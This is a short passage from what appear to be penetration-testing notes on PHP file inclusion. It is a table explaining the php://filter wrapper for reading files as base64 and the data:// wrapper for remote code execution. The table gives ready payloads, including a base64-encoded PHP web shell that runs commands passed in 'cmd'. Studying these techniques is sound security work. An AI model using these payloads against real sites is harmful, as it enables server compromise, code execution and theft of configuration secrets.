...
|-|-|-|-|
| **Filter Wrappers** | Has several parameters, but we mainly use this for **reading resources** | `php://filter/read=convert.base64-encode/resource=config` | `config` is file name |
| **Data Wrappers** | Can be used to include external data - which can be leverage for RCE, including PHP code. Only available to use if the (**`allow_url_include`**) setting is enabled in the PHP configurations. | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | Check if `allow_url_include = On` in config (use **Filter wrapper** or something else to read config file. We can also pass it **base64** encoded strings with **text/plain;base64**, and it has the ability to decode them and execute the PHP code.) |
